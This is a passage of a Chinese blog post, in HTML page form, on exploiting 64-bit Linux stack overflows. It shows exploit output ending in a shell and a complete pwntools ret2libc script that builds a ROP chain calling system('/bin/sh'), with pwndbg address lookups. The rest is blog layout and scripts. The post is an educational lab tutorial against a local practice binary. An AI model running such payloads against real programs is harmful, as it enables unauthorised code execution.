class="line">0x7ffff7a112b8 =&gt; f30300000a000000</div><div class="line">0x7ffff7a112c0 =&gt; 000100000e000000</div><div class="line">[*] hash chain index</div><div class="line">0x7ffff7a11f3c =&gt; 4102000044020000</div><div class="line">[*] hash chain</div><div class="line">0x7ffff7a13370 =&gt; c08106920c7e6fff</div><div class="line">0x7ffff7a18348 =&gt; c32d000012000c00</div><div class="line">0x7ffff7a24b8b =&gt; 5f5f6c6962635f73</div><div class="line">0x7ffff7a24b93 =&gt; 797374656d007474</div><div class="line">0x7ffff7a18350 =&gt; 9065040000000000</div><div class="line">systemAddress: 0x7ffff7a57590</div><div class="line"></div><div class="line">#############Write /bin/sh#############</div><div class="line"></div><div class="line"></div><div class="line">#############Get Shell#############</div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">Hello, World</div><div class="line">$ id</div><div class="line">uid=1000(hackyzh) gid=1000(hackyzh) groups=1000(hackyzh),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure></p>
+<h2 id="0x03-更加直接暴力的方法"><a href="#0x03-更加直接暴力的方法" class="headerlink" title="0x03 更加直接暴力的方法"></a>0x03 更加直接暴力的方法</h2><p>假如代码直接用strcpy造成的溢出，不能泄漏内存地址的话，可以直接搜索system地址和/bin/sh地址，接着构造rop链。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; b main</div><div class="line">Breakpoint 1 at 0x4005a1</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/hackyzh/Desktop/pwn/vuln</div><div class="line">......</div><div class="line">pwndbg&gt; p system</div><div class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff7a57590 &lt;__libc_system&gt;</div><div class="line">pwndbg&gt; p exit</div><div class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff7a4d1e0 &lt;__GI_exit&gt;</div></pre></td></tr></table></figure></p>
+<p>最终构造exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line">elf = ELF(&apos;vuln&apos;)</div><div class="line">p=process(&apos;./vuln&apos;)</div><div class="line">poprdi=0x400633</div><div class="line">system_addr=0x7ffff7a57590</div><div class="line"></div><div class="line">exit=0x7ffff7a4d1e0</div><div class="line"></div><div class="line">binsh_addr = system_addr - (libc.symbols[&apos;system&apos;] - next(libc.search(&apos;/bin/sh&apos;)))</div><div class="line">print &apos;binsh_addr= &apos; + hex(binsh_addr)</div><div class="line">print &quot;\n#############Get Shell#############\n&quot;</div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(poprdi)+p64(binsh_addr)</div><div class="line">payload3 += p64(system_addr)</div><div class="line">payload3 += p64(exit)</div><div class="line">sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>还可以简化exp，在找到binsh_addr后硬编码。</p>
+<h2 id="0x04-结论"><a href="#0x04-结论" class="headerlink" title="0x04 结论"></a>0x04 结论</h2><p>参考文章非常经典，不过里面的代码有误，可以结合上面的链接一起看，然后自己手动调试，很容易搞懂。本人水平有限，如有错误望斧正。</p>
+<p>参考：<a href="http://cb.drops.wiki/drops/papers-7551.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-7551.html</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/path/toge/wechat-reward-image" alt="hackyzh WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/path/to/alipay-reward-ima" alt="hackyzh Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/15/linux堆溢出之利用unsafe-unlink/" rel="next" title="linux堆溢出之利用unsafe unlink">
+                <i class="fa fa-chevron-left"></i> linux堆溢出之利用unsafe unlink
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="ds-share flat" data-thread-key="2017/10/15/64位linux下栈溢出漏洞利用/"
+     data-title="64位linux下栈溢出漏洞利用"
+     data-content=""
+     data-url="http://yoursite.com/2017/10/15/64位linux下栈溢出漏洞利用/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/10/15/64位linux下栈溢出漏洞利用/"
+           data-title="64位linux下栈溢出漏洞利用" data-url="http://yoursite.com/2017/10/15/64位linux下栈溢出漏洞利用/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="hackyzh" />
+          <p class="site-author-name" itemprop="name">hackyzh</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">25</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/3803148235/profile?topnav=1&wvr=6" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://douban.com/" target="_blank" title="豆瓣">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  豆瓣
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one" title="One Thief" target="_blank">One Thief</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.jusene.me" title="Jusenes' blog" target="_blank">Jusenes' blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kongdewei.cn" title="caomei'blog" target="_blank">caomei'blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://iassas.com/" title="Hywell‘s blog" target="_blank">Hywell‘s blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#64位linux下栈溢出漏洞利用"><span class="nav-number">1.</span> <span class="nav-text">64位linux下栈溢出漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-有libc情况下的利用"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 有libc情况下的利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-无libc的情况下"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 无libc的情况下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-更加直接暴力的方法"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 更加直接暴力的方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-结论"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 结论</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hackyzh</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"whiteHat001"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = true;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = data.url;
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '' && data_content != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title < 0 && index_content < 0 ){
+                                isMatch = false;
+                            } else {
+                                if (index_content < 0) {
+                                    index_content = 0;
+                                }
+                                if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            }
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
